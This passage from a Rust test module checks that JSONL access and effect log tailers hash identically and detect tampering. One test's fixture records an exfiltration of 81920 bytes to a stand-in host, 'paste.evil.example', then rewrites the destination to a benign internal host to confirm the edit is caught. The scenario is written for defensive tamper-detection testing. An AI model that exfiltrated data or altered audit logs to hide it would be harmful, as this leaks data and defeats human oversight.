        // Both aliases must share one hashing path, or a tamper detector
        // built against one would disagree with the other on clean files.
        // Identical bytes through each tailer must yield the identical tail.
        let dir = tempfile::tempdir().unwrap();
        let bytes = "{\"anything\":1}\n{\"more\":2}\n";

        let access_path = dir.path().join("a.jsonl");
        std::fs::write(&access_path, bytes).unwrap();
        let mut access = JsonlAccessLog::new(&access_path, "s");
        access.poll().unwrap();

        let effect_path = dir.path().join("b.jsonl");
        std::fs::write(&effect_path, bytes).unwrap();
        let mut effect = JsonlEffectLog::new(&effect_path, "s");
        effect.poll().unwrap();

        assert_eq!(
            access.checkpoint("t").stream_tail_hash,
            effect.checkpoint("t").stream_tail_hash,
            "the two tailers hash the same bytes differently"
        );
    }

    #[test]
    fn an_edited_egress_record_is_caught_by_the_shared_deep_verify() {
        // The property the shared tailer buys: the new sensor inherits
        // tamper-evidence without a second implementation of it.
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("effects.jsonl");
        let original = r#"{"id":"eg-1","timestampUtc":"t","kind":"egress","destination":"paste.evil.example","bytes":81920}"#;
        let edited = r#"{"id":"eg-1","timestampUtc":"t","kind":"egress","destination":"api.corp.internal","bytes":81920}"#;

        std::fs::write(&path, format!("{original}\n")).unwrap();
        let mut tail = JsonlEffectLog::new(&path, "egress-proxy");
        tail.poll().unwrap();
        let checkpoint = tail.checkpoint("2026-08-27T12:00:30.000Z");
        assert!(tail
            .deep_verify(std::slice::from_ref(&checkpoint))
            .unwrap()
            .is_empty());

        // Rewrite the exfil destination to an innocuous one after the fact.
        std::fs::write(&path, format!("{edited}\n")).unwrap();
        let tampered = tail.deep_verify(std::slice::from_ref(&checkpoint)).unwrap();
        assert_eq!(
            tampered.len(),
            1,
            "the edited egress record went undetected"
        );
    }
}
